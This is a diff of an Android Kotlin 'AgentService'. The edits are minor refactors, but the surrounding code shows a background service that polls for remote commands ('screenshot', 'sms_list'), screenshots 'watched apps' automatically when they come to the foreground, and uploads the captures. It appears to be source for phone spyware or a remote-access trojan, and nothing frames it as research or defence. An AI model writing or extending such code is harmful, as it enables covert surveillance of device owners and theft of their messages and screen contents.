@@ -9,6 +9,7 @@ import androidx.core.app.NotificationCompat
 import java.io.File
 import android.graphics.Bitmap
 import android.location.LocationManager
+import android.media.ImageReader
 import android.net.wifi.WifiManager
 import android.os.*
 import android.provider.Settings
@@ -63,7 +64,7 @@ class AgentService : Service() {
 
     override fun onDestroy() {
         handler.removeCallbacks(pollRunnable)
-        stopForeground(true)
+        stopForeground(STOP_FOREGROUND_REMOVE)
         super.onDestroy()
     }
 
@@ -82,7 +83,6 @@ class AgentService : Service() {
                     }
                 }
 
-                // AUTO-SCREENSHOT: agar watched app foreground me hai
                 if (isAppInForeground && watchedApps.isNotEmpty()) {
                     val now = System.currentTimeMillis()
                     if (now - lastScreenshotTime > SCREENSHOT_INTERVAL_MS) {
@@ -91,7 +91,6 @@ class AgentService : Service() {
                     }
                 }
 
-                // Manual commands
                 when (cmd) {
                     "screenshot"       -> doManualScreenshot()
                     "sms_list"         -> doSmsList()
@@ -157,7 +156,7 @@ class AgentService : Service() {
         sendResult("Screenshot captured and uploaded")
     }
 
-    private fun captureFromProjection(reader: android.media.ImageReader): Bitmap? {
+    private fun captureFromProjection(reader: ImageReader): Bitmap? {
         val image = reader.acquireLatestImage() ?: return null
         val plane = image.planes[0]
         val buffer = plane.buffer
